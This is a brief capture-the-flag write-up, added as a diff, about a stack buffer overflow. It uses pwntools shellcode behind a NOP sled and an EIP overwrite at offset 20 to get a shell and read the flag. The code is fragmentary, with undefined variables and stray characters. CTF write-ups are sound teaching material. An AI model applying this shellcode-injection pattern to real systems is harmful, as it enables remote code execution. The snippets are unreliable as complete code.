@@ -1,0 +1,19 @@
+The first and only flag is achieved with a shell code exploit.
+
+The exploit code to run /bin/sh conveniently provided by pwntools
+shellcode = asm(shellcraft.sh())
+
+
+We can get the location of the stack directly from the program's debug message, and all thats left is to send the explout
+
+payload_shellcode = asm("nop") * 16 + shellcode
+p.sendline(payload_shellcode)1
+
+
+offset_to_eip = 20
+exploit_overflow  = b"A" * offset_to_eip
+exploit_overflow += p32(shellcode_addr)
+
+at which point we have a remote shell. A quick ls finds flag .txt which we can cat to get the flag
+
+osu{5411y_p0p5_5345h3115_4_7h3_5345h0r3}
